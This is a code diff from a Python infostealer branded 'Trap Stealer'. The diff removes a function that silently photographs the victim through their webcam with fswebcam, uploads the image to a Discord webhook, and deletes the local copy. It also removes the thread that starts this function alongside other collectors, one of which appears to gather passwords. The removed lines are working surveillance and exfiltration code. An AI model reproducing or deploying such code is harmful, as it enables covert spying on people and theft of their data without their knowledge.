@@ -967,47 +967,6 @@ def srcs():
         pass
 
 
-def Camera_get():
-    try:
-        subprocess.run(["fswebcam", "-q", "image.jpg"])
-
-
-        file = {
-            "file": ("image.jpg", open("image.jpg", "rb"))
-        }
-
-        data = {
-            "username": "Trap Stealer",
-            "content": "",
-            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
-        }
-
-        response = requests.post(webhook, files=file, data=data)
-
-        subprocess.run(["rm", "image.jpg"])
-
-    except FileNotFoundError:
-        data = {
-            "username": "Trap Stealer",
-            "content": "",
-            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
-            "embeds": [
-                {
-                    "title": "🍪 Trap Stealer Camera Stealer",
-                    "description": f"Camera screen cannot be taken",
-                    "color": 0xffb6c1,
-                    "thumbnail": {
-                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
-                    },
-                    "footer": {
-                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
-                    }
-                }
-            ]
-        }
-
-        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 def paaz():
     try:
         global PasswCount
@@ -1277,9 +1236,6 @@ def GatherAll():
     paz.start()
     Threadlist.append(paz)
     
-    cam = threading.Thread(target=Camera_get)
-    cam.start()
-    Threadlist.append(cam)
     for thread in Threadlist:
         thread.join()
     for thread in aa:
